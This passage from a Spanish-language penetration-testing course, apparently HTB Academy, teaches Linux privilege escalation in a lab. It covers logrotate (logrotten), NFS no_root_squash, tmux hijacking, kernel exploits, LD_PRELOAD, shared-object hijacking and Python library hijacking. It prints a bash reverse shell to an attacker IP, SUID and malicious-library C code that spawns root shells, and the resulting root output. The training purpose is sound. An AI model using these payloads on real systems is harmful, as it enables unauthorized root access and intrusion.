vcrdcr@htb[/htb]$ man logrotate
vcrdcr@htb[/htb]$ # or
vcrdcr@htb[/htb]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

La función de la rotación en sí consiste en cambiar el nombre de los archivos de registro. Por ejemplo, se pueden crear nuevos archivos de registro para cada nuevo día, y los más antiguos se renombrarán automáticamente. Otro ejemplo de esto sería vaciar el archivo de registro más antiguo y así reducir el consumo de memoria.

Esta herramienta generalmente se inicia periódicamente a través de `cron` y controlado a través del archivo de configuración `/etc/logrotate.conf`. Dentro de este archivo, contiene configuraciones globales que determinan la función de `logrotate`.

  Logrotar

```shell-session
vcrdcr@htb[/htb]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

Para forzar una nueva rotación el mismo día, podemos establecer la fecha después de los archivos de registro individuales en el archivo de estado `/var/lib/logrotate.status` o usar el `-f`/`--force` opción:

  Logrotar

```shell-session
vcrdcr@htb[/htb]$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

Podemos encontrar los archivos de configuración correspondientes en `/etc/logrotate.d/` directorio.

  Logrotar

```shell-session
vcrdcr@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

  Logrotar

```shell-session
vcrdcr@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

Para explotar `logrotate`, necesitamos algunos requisitos que tenemos que cumplir.

1. necesitamos `write` permisos en los archivos de registro
2. logrotate debe ejecutarse como un usuario privilegiado o `root`
3. versiones vulnerables:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

Hay un exploit prefabricado que podemos usar para esto si se cumplen los requisitos. Este exploit se llama [logrotten](https://github.com/whotwagner/logrotten). Podemos descargarlo y compilarlo en un núcleo similar del sistema de destino y luego transferirlo al sistema de destino. Alternativamente, si podemos compilar el código en el sistema de destino, entonces podemos hacerlo directamente en el sistema de destino.

  Logrotar

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

A continuación, necesitamos que se ejecute una carga útil. Aquí hay muchas opciones diferentes disponibles para nosotros que podemos usar. En este ejemplo, ejecutaremos un shell inverso simple basado en bash con el `IP` y `port` de nuestra VM que utilizamos para atacar el sistema de destino.

  Logrotar

```shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

Sin embargo, antes de ejecutar el exploit, debemos determinar qué opción `logrotate` usos en `logrotate.conf`.

  Logrotar

```shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

En nuestro caso, es la opción: `create`. Por lo tanto, tenemos que utilizar el exploit adaptado a esta función.

Después de eso, tenemos que iniciar un oyente en nuestra VM /Pwnbox, que espera la conexión del sistema de destino.

  Logrotar

```shell-session
vcrdcr@htb[/htb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

Como paso final, ejecutamos el exploit con la carga útil preparada y esperamos un shell inverso como usuario privilegiado o root.

  Logrotar

```shell-session
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

  Logrotar

```shell-session
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```


# Técnicas Varias

---

## Captura de Tráfico Pasivo

Si `tcpdump` está instalado, los usuarios no privilegiados pueden capturar el tráfico de red, incluidas, en algunos casos, las credenciales pasadas en texto claro. Existen varias herramientas, como [créditos netos](https://github.com/DanMcInerney/net-creds) y [PCredz](https://github.com/lgandx/PCredz) eso se puede usar para examinar los datos que se transmiten en el cable. Esto puede resultar en la captura de información confidencial, como números de tarjetas de crédito y cadenas de comunidad SNMP. También puede ser posible capturar hashes Net-NTLMv2, SMBv2 o Kerberos, que podrían estar sujetos a un ataque de fuerza bruta fuera de línea para revelar la contraseña de texto sin formato. Los protocolos de texto claro como HTTP, FTP, POP, IMAP, telnet o SMTP pueden contener credenciales que podrían reutilizarse para escalar privilegios en el host.

---

## Privilegios Débiles de NFS

Network File System (NFS) permite a los usuarios acceder a archivos o directorios compartidos a través de la red alojada en sistemas Unix/Linux. NFS utiliza el puerto TCP/UDP 2049. Cualquier montaje accesible se puede enumerar de forma remota emitiendo el comando `showmount -e`, que enumera la lista de exportación del servidor NFS (o la lista de control de acceso para sistemas de archivos) que los clientes NFS.

  Técnicas Varias

```shell-session
vcrdcr@htb[/htb]$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

Cuando se crea un volumen NFS, se pueden establecer varias opciones:

|Opción|Descripción|
|---|---|
|`root_squash`|Si el usuario raíz se utiliza para acceder a las acciones de NFS, se cambiará a `nfsnobody` usuario, que es una cuenta no privilegiada. Cualquier archivo creado y cargado por el usuario root será propiedad de la `nfsnobody` usuario, que evita que un atacante cargue binarios con el conjunto de bits SUID.|
|`no_root_squash`|Los usuarios remotos que se conecten al recurso compartido como usuario root local podrán crear archivos en el servidor NFS como usuario root. Esto permitiría la creación de scripts/programas maliciosos con el conjunto de bits SUID.|

  Técnicas Varias

```shell-session
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Por ejemplo, podemos crear un binario SETUID que se ejecute `/bin/sh` usando nuestro usuario root local. Entonces podemos montar el `/tmp` directorio localmente, copie el binario propiedad de la raíz en el servidor NFS y establezca el bit SUID.

Primero, cree un binario simple, monte el directorio localmente, cópielo y establezca los permisos necesarios.

  Técnicas Varias

```shell-session
htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

  Técnicas Varias

```shell-session
htb@NIX02:/tmp$ gcc shell.c -o shell
```

  Técnicas Varias

```shell-session
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

Cuando volvemos a la sesión de bajo privilegio del host, podemos ejecutar el binario y obtener un shell raíz.

  Técnicas Varias

```shell-session
htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

  Técnicas Varias

```shell-session
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

---

## Secuestro de Sesiones Tmux

Multiplexores de terminales como [tmux](https://en.wikipedia.org/wiki/Tmux) se puede utilizar para permitir el acceso a múltiples sesiones de terminal dentro de una sola sesión de consola. Cuando no se trabaja en un `tmux` ventana, podemos separarnos de la sesión, dejándola activa (es decir, ejecutando un `nmap` escanear). Por muchas razones, un usuario puede dejar un `tmux` proceso que se ejecuta como un usuario privilegiado, como la configuración raíz con permisos débiles, y puede ser secuestrado. Esto se puede hacer con los siguientes comandos para crear una nueva sesión compartida y modificar la propiedad.

  Técnicas Varias

```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

Si podemos comprometer a un usuario en el `devs` grupo, podemos adjuntar a esta sesión y obtener acceso root.

Compruebe si hay alguna carrera `tmux` procesos.

  Técnicas Varias

```shell-session
htb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Confirmar permisos.

  Técnicas Varias

```shell-session
htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Revise nuestra membresía grupal.

  Técnicas Varias

```shell-session
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Finalmente, adjúntese al `tmux` session y confirmar privilegios de root.

  Técnicas Varias

```shell-session
htb@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```


# Explotaciones de Kernel

---

Existen exploits de nivel de kernel para una variedad de versiones del kernel de Linux. Un ejemplo muy conocido es [VACA Sucia](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195). Estas vulnerabilidades de apalancamiento en el kernel para ejecutar código con privilegios de root. Es muy común encontrar sistemas que sean vulnerables a los exploits del kernel. Puede ser difícil realizar un seguimiento de los sistemas heredados, y pueden excluirse de los parches debido a problemas de compatibilidad con ciertos servicios o aplicaciones.

La escalada de privilegios utilizando un exploit de kernel puede ser tan simple como descargarlo, compilarlo y ejecutarlo. Algunos de estos exploits funcionan fuera de la caja, mientras que otros requieren modificación. Una forma rápida de identificar exploits es emitir el comando `uname -a` y busque en Google la versión del kernel.

Nota: Los exploits de kernel pueden causar inestabilidad del sistema, así que tenga cuidado al ejecutarlos contra un sistema de producción.

---

## Ejemplo de Explotación de Kernel

Comencemos comprobando el nivel de Kernel y la versión de Linux OS.

  Explotaciones de Kernel

```shell-session
vcrdcr@htb[/htb]$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

  Explotaciones de Kernel

```shell-session
vcrdcr@htb[/htb]$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

Podemos ver que estamos en Linux Kernel 4.4.0-116 en un cuadro Ubuntu 16.04.4 LTS. Una búsqueda rápida en Google para `linux 4.4.0-116-generic exploit` se le ocurre [esto](https://vulners.com/zdt/1337DAY-ID-30003) explotar PoC. Luego descárguelo al sistema usando `wget` u otro método de transferencia de archivos. Podemos compilar el código de explotación utilizando [gcc](https://linux.die.net/man/1/gcc) y establezca el bit ejecutable usando `chmod +x`.

  Explotaciones de Kernel

```shell-session
vcrdcr@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

A continuación, ejecutamos el exploit y, con suerte, nos dejan caer en un caparazón raíz.

  Explotaciones de Kernel

```shell-session
vcrdcr@htb[/htb]$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

Finalmente, podemos confirmar el acceso raíz a la caja.

  Explotaciones de Kernel

```shell-session
root@htb[/htb]# whoami

root
```

Nota: El sistema de destino se ha actualizado, pero sigue siendo vulnerable. Utilice un exploit de kernel creado en 2021.


# Bibliotecas Compartidas

---

Es común que los programas de Linux utilicen bibliotecas de objetos compartidos vinculadas dinámicamente. Las bibliotecas contienen código compilado u otros datos que los desarrolladores usan para evitar tener que volver a escribir las mismas piezas de código en múltiples programas. Existen dos tipos de bibliotecas en Linux: `static libraries` (denotado por la extensión de archivo .a) y `dynamically linked shared object libraries` (denotado por la extensión de archivo .so). Cuando se compila un programa, las bibliotecas estáticas se convierten en parte del programa y no pueden ser alteradas. Sin embargo, las bibliotecas dinámicas se pueden modificar para controlar la ejecución del programa que las llama.

Existen múltiples métodos para especificar la ubicación de las bibliotecas dinámicas, por lo que el sistema sabrá dónde buscarlas en la ejecución del programa. Esto incluye el `-rpath` o `-rpath-link` banderas al compilar un programa, utilizando las variables ambientales `LD_RUN_PATH` o `LD_LIBRARY_PATH`, colocando bibliotecas en el `/lib` o `/usr/lib` directorios predeterminados, o especificar otro directorio que contenga las bibliotecas dentro del `/etc/ld.so.conf` archivo de configuración.

Además, el `LD_PRELOAD` la variable de entorno puede cargar una biblioteca antes de ejecutar un binario. Las funciones de esta biblioteca tienen preferencia sobre las predeterminadas. Los objetos compartidos requeridos por un binario se pueden ver usando el `ldd` utilidad.

  Bibliotecas Compartidas

```shell-session
htb_student@NIX02:~$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

La imagen de arriba enumera todas las bibliotecas requeridas por `/bin/ls`, junto con sus caminos absolutos.

---

## LD_PRELOAD Escalada de Privilegios

Veamos un ejemplo de cómo podemos utilizar el [LD_PRECARGAR](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) variable de entorno para escalar privilegios. Para esto, necesitamos un usuario con `sudo` privilegios.

  Bibliotecas Compartidas

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

Este usuario tiene derechos para reiniciar el servicio Apache como root, pero como esto es `NOT` a [GTFOBina](https://gtfobins.github.io/#apache) y el `/etc/sudoers` la entrada se escribe especificando la ruta absoluta, esto no se podría utilizar para escalar privilegios en circunstancias normales. Sin embargo, podemos explotar el `LD_PRELOAD` problema para ejecutar un archivo de biblioteca compartido personalizado. Compilemos la siguiente biblioteca:

Código: c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Podemos compilar esto de la siguiente manera:

  Bibliotecas Compartidas

```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Finalmente, podemos escalar privilegios usando el siguiente comando. Asegúrese de especificar la ruta completa a su archivo de biblioteca malicioso.

  Bibliotecas Compartidas

```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```



# Secuestro de Objetos Compartidos

---

Los programas y binarios en desarrollo generalmente tienen bibliotecas personalizadas asociadas con ellos. Considere lo siguiente `SETUID` binario.

  Secuestro de Objetos Compartidos

```shell-session
htb-student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

Podemos usar [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) para imprimir el objeto compartido requerido por un objeto binario o compartido. `Ldd` muestra la ubicación del objeto y la dirección hexadecimal donde se carga en la memoria para cada una de las dependencias de un programa.

  Secuestro de Objetos Compartidos

```shell-session
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

Vemos una biblioteca no estándar nombrada `libshared.so` listado como una dependencia para el binario. Como se indicó anteriormente, es posible cargar bibliotecas compartidas desde ubicaciones personalizadas. Una de esas configuraciones es la `RUNPATH` configuración. Las bibliotecas en esta carpeta tienen preferencia sobre otras carpetas. Esto se puede inspeccionar usando el [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) utilidad.

  Secuestro de Objetos Compartidos

```shell-session
htb-student@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

La configuración permite la carga de bibliotecas desde el `/development` carpeta, que es escribible por todos los usuarios. Esta configuración incorrecta se puede explotar colocando una biblioteca maliciosa en `/development`, que tendrá prioridad sobre otras carpetas porque las entradas en este archivo se comprueban primero (antes de otras carpetas presentes en los archivos de configuración).

  Secuestro de Objetos Compartidos

```shell-session
htb-student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

Antes de compilar una biblioteca, necesitamos encontrar el nombre de la función llamado por el binario.

  Secuestro de Objetos Compartidos

```shell-session
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

  Secuestro de Objetos Compartidos

```shell-session
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

  Secuestro de Objetos Compartidos

```shell-session
htb-student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

Podemos copiar una biblioteca existente a la `development` carpeta. Corriendo `ldd` contra las listas binarias la ruta de la biblioteca como `/development/libshared.`entonces, lo que significa que es vulnerable. Ejecutar el binario arroja un error que indica que no pudo encontrar la función nombrada `dbquery`. Podemos compilar un objeto compartido que incluye esta función.

Código: c

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

```

El `dbquery` la función establece nuestro id de usuario en 0 (root) y ejecución `/bin/sh` cuando se llama. Compílalo usando [CCG](https://linux.die.net/man/1/gcc).

  Secuestro de Objetos Compartidos

```shell-session
htb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
```

Ejecutar el binario nuevamente debería mostrar el banner y mostrar un shell raíz.

  Secuestro de Objetos Compartidos

```shell-session
htb-student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```


# Secuestro de la Biblioteca Python

---

Python es uno de los lenguajes de programación más populares y ampliamente utilizados del mundo y ya ha reemplazado a muchos otros lenguajes de programación en la industria de TI. Hay muchas razones por las que Python es tan popular entre los programadores. Una de ellas es que los usuarios pueden trabajar con una vasta colección de bibliotecas.

Muchas bibliotecas se utilizan en Python y se utilizan en muchos campos diferentes. Uno de ellos es [NumPy](https://numpy.org/doc/stable/). `NumPy` es una extensión de código abierto para Python. El módulo proporciona funciones precompiladas para el análisis numérico. En particular, permite un fácil manejo de listas y matrices extensas. Sin embargo, ofrece muchas otras características esenciales, como funciones de generación de números aleatorios, transformada de Fourier, álgebra lineal y muchas otras. Además, NumPy proporciona muchas funciones matemáticas para trabajar con matrices y matrices.

Otra biblioteca es [Pandas](https://pandas.pydata.org/docs/). `Pandas` es una biblioteca para el procesamiento de datos y análisis de datos con Python. Extiende Python con estructuras de datos y funciones para procesar tablas de datos. Una fortaleza particular de Pandas es el análisis de series de tiempo. 

Python tiene [la biblioteca estándar de Python](https://docs.python.org/3/library/), con muchos módulos a bordo de una instalación estándar de Python. Estos módulos proporcionan muchas soluciones que de otro modo tendrían que ser trabajosamente elaboradas escribiendo nuestros programas. Hay innumerables horas de trabajo guardado aquí si uno tiene una visión general de los módulos disponibles y sus posibilidades. El sistema modular está integrado en esta forma por razones de rendimiento. Si uno automáticamente tuviera todas las posibilidades disponibles de inmediato en la instalación básica de Python sin importar el módulo correspondiente, la velocidad de todos los programas de Python sufriría mucho.

En Python, podemos importar módulos con bastante facilidad:

#### Módulos de Importación

Código: pitón

```python
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```

Hay muchas maneras en que podemos secuestrar una biblioteca de Python. Mucho depende del guión y su contenido en sí. Sin embargo, hay tres vulnerabilidades básicas donde se puede utilizar el secuestro:

1. Permisos de escritura incorrectos
2. Ruta de la Biblioteca
3. variable de entorno PYTHONPATH

---

## Permisos de Escritura Incorrecta

Por ejemplo, podemos imaginar que estamos en el host de un desarrollador en la intranet de la compañía y que el desarrollador está trabajando con python. Así que tenemos un total de tres componentes que están conectados. Este es el script python real que importa un módulo python y los privilegios del script, así como los permisos del módulo.

Uno u otro módulo python puede tener permisos de escritura establecidos para todos los usuarios por error. Esto permite que el módulo python sea editado y manipulado para que podamos insertar comandos o funciones que producirán los resultados que queremos. Si `SUID`/`SGID` se han asignado permisos al script Python que importa este módulo, nuestro código se incluirá automáticamente.

Si miramos los permisos establecidos de la `mem_status.py` guión, podemos ver que tiene un `SUID` conjunto.

#### Script Python

  Secuestro de la Biblioteca Python

```shell-session
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

Así podemos ejecutar este script con los privilegios de otro usuario, en nuestro caso, como `root`. También tenemos permiso para ver el script y leer su contenido.

#### Python Script - Contenido

Código: pitón

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

Así que este script es bastante simple y solo muestra la memoria virtual disponible en porcentaje. También podemos ver en la segunda línea que este script importa el módulo `psutil` y utiliza la función `virtual_memory()`.

Así que podemos buscar esta función en la carpeta de `psutil` y compruebe si este módulo tiene permisos de escritura para nosotros.

#### Permisos de Módulo

  Secuestro de la Biblioteca Python

```shell-session
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Dichos permisos son más comunes en entornos de desarrolladores donde muchos desarrolladores trabajan en diferentes scripts y pueden requerir privilegios más altos.

#### Contenido del Módulo

Código: pitón

```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Esta es la parte de la biblioteca donde podemos insertar nuestro código. Se recomienda ponerlo justo al comienzo de la función. Allí podemos insertar todo lo que consideremos correcto y efectivo. Podemos importar el módulo `os` para fines de prueba, lo que nos permite ejecutar comandos del sistema. Con esto, podemos insertar el comando `id` y compruebe durante la ejecución del script si se ejecuta el código insertado.

#### Contenido del Módulo - Hijacking

Código: pitón

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Ahora podemos ejecutar el script con `sudo` y compruebe si obtenemos el resultado deseado.

#### Escalada Privilegio

  Secuestro de la Biblioteca Python

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

Éxito. Como podemos ver en el resultado anterior, pudimos secuestrar con éxito la biblioteca y tener nuestro código dentro del `virtual_memory()` la función funciona como `root`. Ahora que tenemos el resultado deseado, podemos editar la biblioteca de nuevo, pero esta vez, insertar un shell inverso que se conecta a nuestro host como `root`.

---

## Ruta de la Biblioteca

En Python, cada versión tiene un orden específico en el que las bibliotecas (`modules`) se buscan e importan desde. El orden en que importa Python `modules` los de se basan en un sistema de prioridad, lo que significa que las rutas más altas en la lista tienen prioridad sobre las más bajas en la lista. Podemos ver esto emitiendo el siguiente comando:

#### Listado de PYTHONPATH

  Secuestro de la Biblioteca Python

```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

Para poder utilizar esta variante, son necesarios dos requisitos previos.

1. El módulo importado por el script se encuentra debajo de una de las rutas de menor prioridad enumeradas a través del `PYTHONPATH` variable.
2. Debemos tener permisos de escritura en una de las rutas que tienen una prioridad más alta en la lista.

Por lo tanto, si el módulo importado se encuentra en una ruta más baja en la lista y nuestro usuario puede editar una ruta de mayor prioridad, podemos crear un módulo nosotros mismos con el mismo nombre e incluir nuestras propias funciones deseadas. Dado que la ruta de mayor prioridad se lee anteriormente y se examina para el módulo en cuestión, Python accede al primer golpe que encuentra e importa antes de llegar al módulo original y previsto.

Para que esto tenga un poco más de sentido, continuemos con el ejemplo anterior y mostremos cómo se puede explotar. Anteriormente, el `psutil` el módulo fue importado al `mem_status.py` guión. Podemos ver `psutil`'s ubicación de instalación predeterminada emitiendo el siguiente comando:

#### Psutil Ubicación Default de la instalación

  Secuestro de la Biblioteca Python

```shell-session
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

De este ejemplo, podemos ver eso `psutil` se instala en la siguiente ruta: `/usr/local/lib/python3.8/dist-packages`. De nuestra lista anterior de la `PYTHONPATH` variable, tenemos una cantidad razonable de directorios para elegir para ver si puede haber alguna configuración incorrecta en el entorno que nos permita `write` acceso a cualquiera de ellos. Comprobamos.

#### Permisos de Directorio mal configurados

  Secuestro de la Biblioteca Python

```shell-session
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

Después de verificar todos los directorios enumerados, parece que `/usr/lib/python3.8` la ruta está mal configurada para permitir que cualquier usuario le escriba. Cross-checking con valores de la `PYTHONPATH` variable, podemos ver que esta ruta es más alta en la lista que la ruta en la que `psutil` está instalado en. Intentemos abusar de esta configuración errónea para crear la nuestra `psutil` módulo que contiene nuestro propio malicioso `virtual_memory()` función dentro del `/usr/lib/python3.8` directorio.

#### Contenido del Módulo Secuestrado - psutil.py

Código: pitón

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Para llegar a este punto, necesitamos crear un archivo llamado `psutil.py` conteniendo los contenidos enumerados anteriormente en el directorio mencionado anteriormente. Es muy importante que nos aseguremos de que el módulo que creamos tenga el mismo nombre que la importación, así como que tenga la misma función con el número correcto de argumentos que se le pasan como la función que pretendemos secuestrar. Esto es crítico ya que sin que ninguna de estas condiciones sea `true`, no podremos realizar este ataque. Después de crear este archivo que contiene el ejemplo de nuestro script de secuestro anterior, hemos preparado con éxito el sistema para su explotación.

Corramos una vez más el `mem_status.py` script usando `sudo` como en el ejemplo anterior.

#### Escalada de privilegios a través de Hijacking Python Library Path

  Secuestro de la Biblioteca Python

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

Como podemos ver en la salida, hemos ganado con éxito la ejecución como `root` mediante el secuestro de la ruta del módulo a través de una configuración incorrecta en los permisos de la `/usr/lib/python3.8` directorio.

---

## PYTHONPATH Entorno Variable

